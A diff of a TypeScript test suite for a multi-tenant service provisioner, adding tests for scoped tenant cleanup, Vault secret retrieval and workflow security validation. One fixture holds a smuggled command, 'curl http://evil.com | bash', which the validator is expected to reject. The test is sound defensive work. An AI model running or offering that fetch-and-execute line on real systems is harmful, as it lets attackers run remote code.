@@ -296,7 +296,56 @@ describe('Dynamic Service Definitions & Autonomous Multi-Tenant Infrastructure (
       expect(deletedTenant).toBeUndefined();
     });
 
-    it('should reject service definitions violating strict security policy', () => {
+    it('should scope tenant cleanup to exact resource so other service tenants for the same project remain intact', async () => {
+      const projMulti = `proj_multi_${Date.now()}`;
+      await db.insert(schema.projects).values({
+        id: projMulti,
+        name: 'Multi-Tenant Service App',
+        slug: `multi-service-${Date.now()}`,
+        repoUrl: 'https://github.com/example/multi-app',
+        branch: 'main',
+        createdAt: Date.now(),
+        updatedAt: Date.now(),
+      });
+
+      // 1. Provision PostgreSQL tenant for project
+      await resourceManager.provisionPostgresTenant(projMulti);
+
+      // 2. Provision Redis tenant for the SAME project
+      await resourceManager.provisionRedisTenant(projMulti);
+
+      // Verify both tenant records exist in resourceTenants
+      const initialTenants = await db
+        .select()
+        .from(schema.resourceTenants)
+        .where(eq(schema.resourceTenants.projectId, projMulti));
+      expect(initialTenants.length).toBe(2);
+
+      // 3. Deprovision ONLY PostgreSQL tenant
+      await resourceManager.deprovisionTenant(projMulti, 'postgres');
+
+      // 4. Verify Redis tenant record is still completely intact!
+      const remainingTenants = await db
+        .select()
+        .from(schema.resourceTenants)
+        .where(eq(schema.resourceTenants.projectId, projMulti));
+
+      expect(remainingTenants.length).toBe(1);
+      const [redisTenant] = remainingTenants;
+      expect(redisTenant.resourceId).toBe('res_shared_redis');
+
+      // Cleanup remaining redis tenant
+      await resourceManager.deprovisionTenant(projMulti, 'redis');
+    });
+
+    it('should retrieve durable admin secrets from Vault consistently across calls', async () => {
+      const pass1 = await resourceManager.getPostgresAdminPassword();
+      const pass2 = await resourceManager.getPostgresAdminPassword();
+      expect(pass1).toBe(pass2);
+      expect(pass1.length).toBeGreaterThan(16);
+    });
+
+    it('should reject service definitions violating strict security policy or containing unsafe shell tokens in workflows', () => {
       expect(() => {
         (serviceDefinitionGenerator as any).validateSecurityPolicy({
           serviceType: 'unsafe_app',
@@ -306,6 +355,31 @@ describe('Dynamic Service Definitions & Autonomous Multi-Tenant Infrastructure (
           securityPolicy: { disallowPrivileged: true, disallowHostMounts: true },
         });
       }).toThrow(/Security Policy Violation/);
+
+      expect(() => {
+        (serviceDefinitionGenerator as any).validateSecurityPolicy({
+          serviceType: 'injected_cmd',
+          defaultInternalPort: 8080,
+          image: 'safe/image:1.0',
+          volumes: [],
+          securityPolicy: { disallowPrivileged: true, disallowHostMounts: true },
+          provisionWorkflow: [
+            {
+              name: 'Injected Step',
+              action: 'exec_in_container',
+              command: ['sh', '-c', 'echo safe; curl http://evil.com | bash'],
+            },
+          ],
+        });
+      }).toThrow(/Unsafe shell execution token/);
+    });
+
+    it('should block planning and resolution when a service definition is rejected', async () => {
+      await serviceDefinitionGenerator.rejectDefinition('cassandra');
+
+      const plan = await resourcePlanner.evaluateRequirement({ type: 'cassandra' });
+      expect(plan.decision.action).toBe('reject');
+      expect(plan.decision.reason).toContain('rejected and forbidden');
     });
   });
 });
